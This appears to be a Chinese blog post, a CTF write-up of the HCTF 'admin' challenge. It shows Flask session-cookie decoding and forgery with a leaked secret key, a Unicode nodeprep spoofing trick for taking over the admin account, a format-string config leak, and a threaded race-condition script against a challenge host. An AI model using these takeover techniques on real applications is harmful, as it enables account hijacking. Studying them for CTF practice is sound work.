@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一道很经典的题目，拿来复现，一共有三种思路1.flask session 伪造2.unicode欺骗3.条件竞争随便注册一个账号登陆，提示不是admin，在change password页面源码找到git网站源码链接 flask session 伪造flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hctf-admin">
+<meta property="og:url" content="http://yoursite.com/2019/12/19/hctf-admin/index.html">
+<meta property="og:site_name" content="cop&#39;s blog">
+<meta property="og:description" content="一道很经典的题目，拿来复现，一共有三种思路1.flask session 伪造2.unicode欺骗3.条件竞争随便注册一个账号登陆，提示不是admin，在change password页面源码找到git网站源码链接 flask session 伪造flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i2.tiimg.com/706174/cea24a5d2471a049.png">
+<meta property="og:image" content="https://i2.tiimg.com/706174/050d477e3fc0fee7.png">
+<meta property="og:image" content="https://github.com/noraj/flask-session-cookie-manager">
+<meta property="og:image" content="https://i2.tiimg.com/706174/9837ac8d23ee67ef.png">
+<meta property="og:image" content="https://i1.fuimg.com/706174/c98da12fc2771ea0.png">
+<meta property="og:image" content="https://i1.fuimg.com/706174/e1ee07d24bca97de.png">
+<meta property="og:image" content="https://i1.fuimg.com/706174/511bb9f94f62025e.png">
+<meta property="og:image" content="https://i1.fuimg.com/706174/0033ff4dd20ce3d8.png">
+<meta property="og:image" content="https://unicode-table.com/">
+<meta property="og:updated_time" content="2019-12-19T08:43:54.903Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hctf-admin">
+<meta name="twitter:description" content="一道很经典的题目，拿来复现，一共有三种思路1.flask session 伪造2.unicode欺骗3.条件竞争随便注册一个账号登陆，提示不是admin，在change password页面源码找到git网站源码链接 flask session 伪造flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防">
+<meta name="twitter:image" content="https://i2.tiimg.com/706174/cea24a5d2471a049.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/19/hctf-admin/">
+
+
+
+
+
+  <title>hctf-admin | cop's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cop's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/19/hctf-admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cop's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hctf-admin</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-19T14:23:45+08:00">
+                2019-12-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>一道很经典的题目，拿来复现，一共有三种思路<br>1.flask session 伪造<br>2.unicode欺骗<br>3.条件竞争<br>随便注册一个账号登陆，提示不是admin，在change password页面源码找到git网站源码链接</p>
+<h2 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h2><p>flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无<br>法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">ph师傅的文章</a><br>附上解密session脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    <span class="keyword">if</span> payload.startswith(b<span class="string">'.'</span>):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure></p>
+<p>解密自己的session如下<br><img src="https://i2.tiimg.com/706174/cea24a5d2471a049.png" alt><br>读到index.html<br><img src="https://i2.tiimg.com/706174/050d477e3fc0fee7.png" alt><br>只要用户名为admin就会输出flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_fresh'</span>: True, <span class="string">'_id'</span>: b<span class="string">'6348c0691b2f9a9115cf42fab824c2ee6e868ed7932a49a94cb2e224b4b97017b8ed1342c30300623c8662de965f8b1d3497e8007196b89c07fff4c567566eac'</span>, <span class="string">'csrf_token'</span>: b<span class="string">'85d6c3246331795f8340bd6bf73c12a7a98d2fbe'</span>, <span class="string">'image'</span>: b<span class="string">'3H8n'</span>, <span class="string">'name'</span>: <span class="string">'cop'</span>, <span class="string">'user_id'</span>: <span class="string">'10'</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>把解密后的结果 name替换为amdin<br>在config.py中找到SECRET_KEY ：ckj123<br>flask session 加密脚本<br><img src="https://github.com/noraj/flask-session-cookie-manager" alt="github地址"><br>加密结果<br><img src="https://i2.tiimg.com/706174/9837ac8d23ee67ef.png" alt><br>然python3和python2的flask session生成机制不同，可是利用上述脚本生成的session都可以得到flag<br><img src="https://i1.fuimg.com/706174/c98da12fc2771ea0.png" alt></p>
+<p>这道题给了源码，如果得不到SECRET_KEY就无法伪造session<br>有的情况可以配合python格式化字符串的问题，任意文件读取<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; config = &#123;<span class="string">'SECRET_KEY'</span>: <span class="string">'12345'</span>&#125;</span><br><span class="line">&gt;&gt;&gt; class User(object):</span><br><span class="line">...  def __init__(self, name):</span><br><span class="line">...   self.name = name</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; user = User(<span class="string">'joe'</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="string">'&#123;0.__class__.__init__.__globals__[config]&#125;'</span>.format(user)</span><br><span class="line"><span class="string">"&#123;'SECRET_KEY': '12345'&#125;"</span></span><br></pre></td></tr></table></figure></p>
+<p>先附上<a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">先知</a>和<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">ph师傅</a>的文章，有时间了再深入学习一下</p>
+<h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p>register login<br><img src="https://i1.fuimg.com/706174/e1ee07d24bca97de.png" alt><br>change<br><img src="https://i1.fuimg.com/706174/511bb9f94f62025e.png" alt><br>都使用了strlower()转小写，但是python有自带的lower()转小写函数<br>跟进strlower()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="built_in">return</span> username</span><br></pre></td></tr></table></figure></p>
+<p>这里用的nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现Twisted==10.2.0，而官网最新已<br>经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。<br><img src="https://i1.fuimg.com/706174/0033ff4dd20ce3d8.png" alt><br>然后我们发现在使用nodeprep.prepare函数转换时过程如下：<br>ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin<br>ᴬᴰᴹᴵᴺ 其中的字符是修饰字符小型大写<img src="https://unicode-table.com/" alt="在这里可以找到"><br>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户<br>名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用<br>admin账号登录即可拿到flag。</p>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>这个漏洞应该是属于代码逻辑上的漏洞<br>![]<a href="https://i1.fuimg.com/706174/2b03a496b793d0ed.png" target="_blank" rel="noopener">https://i1.fuimg.com/706174/2b03a496b793d0ed.png</a>)<br>在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：<br>我们注册一个用户test，现在有一个进程1一直重复进行登录、改密码操作，进程2一直注销，且以admin用户和进程1所改的密码进行登录，是<br>不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将<br>session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。</p>
+<p>不过从理论上来讲应该是能够改掉admin的密码的，可是在实际测试并没有成功。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def login(s, username, password):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> s.post(<span class="string">"http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">logout</span>(s):</span><br><span class="line">    <span class="built_in">return</span> s.get(<span class="string">"http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/logout"</span>)</span><br><span class="line"></span><br><span class="line">def change(s, newpassword):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> s.post(<span class="string">"http://db0fc0e1-b704-4643-b0b6-d39398ff329a.node1.buuoj.cn/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line">def func1(s):</span><br><span class="line">    login(s, <span class="string">'test'</span>, <span class="string">'test'</span>)</span><br><span class="line">    change(s, <span class="string">'test'</span>)</span><br><span class="line"></span><br><span class="line">def func2(s):</span><br><span class="line">    <span class="built_in">logout</span>(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'test'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1000):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/18/nctf2019/" rel="next" title="nctf2019">
+                <i class="fa fa-chevron-left"></i> nctf2019
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/20/nctf2019 phar matches everything/" rel="prev" title="nctf2019">
+                nctf2019 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cop</p>
+              <p class="site-description motion-element" itemprop="description">cop's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-session-伪造"><span class="nav-number">1.</span> <span class="nav-text">flask session 伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unicode欺骗"><span class="nav-number">2.</span> <span class="nav-text">unicode欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#条件竞争"><span class="nav-number">3.</span> <span class="nav-text">条件竞争</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body>
+</html>
